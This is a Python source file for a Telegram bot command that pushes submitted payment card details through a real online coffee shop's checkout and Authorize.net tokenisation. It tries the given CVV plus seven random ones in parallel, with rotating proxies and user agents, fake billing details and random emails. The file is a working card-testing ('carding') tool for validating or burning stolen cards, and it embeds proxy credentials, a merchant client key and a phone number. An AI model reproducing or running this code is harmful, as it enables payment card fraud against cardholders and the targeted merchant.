import requests as r
from bs4 import BeautifulSoup
import re
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import uuid
from telethon import TelegramClient, events
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global proxies configuration (modify as needed)
proxies_list = [
    {"http": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/", "https": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/"}
]

# Number of threads for concurrent processing
THREADS = 8

# List of user agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def generate_random_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(domains)
    return f"{name}@{domain}"

def get_headers(referer_url):
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Referer': referer_url,
        'User-Agent': get_random_user_agent(),
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

def get_checkout_nonce(session, checkout_url, proxy):
    try:
        headers = get_headers(checkout_url)
        response = session.get(checkout_url, headers=headers, proxies=proxy, timeout=15)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'woocommerce-process-checkout-nonce'})['value']
        return nonce
    except Exception as e:
        logger.error(f"Nonce fetch failed: {e}")
        return None

def get_payment_token(session, card_info, full_name, proxy):
    cc, mm, yy, cvv = card_info.split('|')
    expiration = f"{mm}{yy[-2:]}"
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://coffeecrafters.com',
        'Referer': 'https://coffeecrafters.com/',
        'User-Agent': get_random_user_agent(),
    }

    json_data = {
        'securePaymentContainerRequest': {
            'merchantAuthentication': {
                'name': '8vtpYA46C',
                'clientKey': '7cG75dD7t3qrSffk7ARGu749uPQy9Xm5677ahHzNPduL8rJXNFBHh4CJsmRXc3X2',
            },
            'data': {
                'type': 'TOKEN',
                'id': str(uuid.uuid4()),
                'token': {
                    'cardNumber': cc,
                    'expirationDate': expiration,
                    'cardCode': cvv,
                    'fullName': full_name,
                },
            },
        },
    }

    try:
        response = session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data, proxies=proxy, timeout=15)
        pattern = r'"dataValue":\s*"([^"]+)"'
        match = re.search(pattern, response.text)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        logger.error(f"Payment token fetch failed: {e}")
        return None

def process_cvv(card_info, cvv, proxy, full_name="Mohammed Nehal"):
    # Create fresh session for each attempt
    session = r.Session()
    url = "https://coffeecrafters.com/product/valenta-12/"
    
    # Step 1: Get product page
    headers = get_headers(url)
    try:
        response = session.get(url, headers=headers, proxies=proxy, timeout=15)
        if response.status_code != 200:
            return f"{cvv} - Failed to load product page"
    except Exception as e:
        return f"{cvv} - Product page error: {str(e)}"

    # Step 2: Add to cart
    headers = {
        'User-Agent': get_random_user_agent(),
        'Referer': url,
    }
    files = {
        'attribute_pa_add-des-200': (None, 'yes-1295'),
        'attribute_pa_add-fs-300': (None, 'yes-2200'),
        'quantity': (None, '1'),
        'add-to-cart': (None, '27285'),
        'product_id': (None, '27285'),
        'variation_id': (None, '28663'),
    }
    
    try:
        response = session.post(url, headers=headers, files=files, proxies=proxy, timeout=15)
        if response.status_code != 200:
            return f"{cvv} - Failed to add to cart"
    except Exception as e:
        return f"{cvv} - Add to cart error: {str(e)}"

    # Step 3: Go to checkout
    checkout_url = 'https://coffeecrafters.com/checkout/'
    nonce = get_checkout_nonce(session, checkout_url, proxy)
    if not nonce:
        return f"{cvv} - Failed to get checkout nonce"

    # Step 4: Get payment token
    card_info_with_cvv = f"{card_info[:card_info.rfind('|')]}|{cvv}"
    data_value = get_payment_token(session, card_info_with_cvv, full_name, proxy)
    if not data_value:
        return f"{cvv} - Failed to get payment token"

    # Step 5: Submit checkout
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-GB,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://coffeecrafters.com',
        'referer': checkout_url,
        'user-agent': get_random_user_agent(),
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'checkout',
    }

    data = {
        "wc_order_attribution_source_type": "typein",
        "wc_order_attribution_referrer": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": "https://coffeecrafters.com/",
        "wc_order_attribution_session_start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "wc_order_attribution_session_pages": "5",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": get_random_user_agent(),
        "billing_first_name": "Mohammed",
        "billing_last_name": "Nehal",
        "billing_company_name": "",
        "billing_country": "US",
        "billing_address_1": "New York",
        "billing_address_2": "",
        "billing_city": "New York",
        "billing_state": "NY",
        "billing_postcode": "10040",
        "billing_phone": "+917975102052",
        "billing_email": generate_random_email(),
        "shipping_first_name": "",
        "shipping_last_name": "",
        "shipping_company_name": "",
        "shipping_country": "",
        "shipping_address_1": "",
        "shipping_address_2": "",
        "shipping_city": "",
        "shipping_state": "",
        "shipping_postcode": "",
        "order_comments": "",
        "shipping_method[0]": "flat_rate:1",
        "payment_method": "authnet",
        "terms": "on",
        "terms-field": "1",
        "woocommerce-process-checkout-nonce": nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
        "authnet_nonce": data_value,
        "authnet_data_descriptor": "COMMON.ACCEPT.INAPP.PAYMENT"
    }

    try:
        response = session.post('https://coffeecrafters.com/', params=params, headers=headers, data=data, proxies=proxy, timeout=15)
        try:
            result = response.json()
            if 'result' in result and result['result'] == 'success':
                return f"{cvv} - Order placed successfully"
            if 'This transaction has been declined.' in str(result.get('messages', '')):
                return f"{cvv} - This transaction has been declined."
            return f"{cvv} - Checkout failed: {result.get('messages', 'No error message')}"
        except:
            return f"{cvv} - Response parse failed"
    except Exception as e:
        return f"{cvv} - Checkout error: {str(e)}"

async def kum(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    """Process card and send results to Telegram with CVV randomization."""
    try:
        card_parts = re.split(r'[|/ ]', card_info.strip())
        if len(card_parts) < 4 or not all(p.isdigit() for p in card_parts):
            raise ValueError("Invalid card format")
            
        cc, mm, yy, real_cvv = card_parts[:4]
    except ValueError:
        await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
        return

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()
    cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(7)]  # Test real CVV + 7 random

    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
            results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))

        end_time = time.time()
        total_time = end_time - start_time
        
        # Format results
        result_message = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"
        for result in results:
            result_message += f"{result}\n"
        result_message += f"\n⏱ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: {total_time:.2f} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴\n"
        
        await processing_msg.edit(result_message)
    except Exception as e:
        logger.error(f"Error in kum function: {str(e)}")
        await processing_msg.edit(f"❌ **Error**: Failed to process card - {str(e)}")
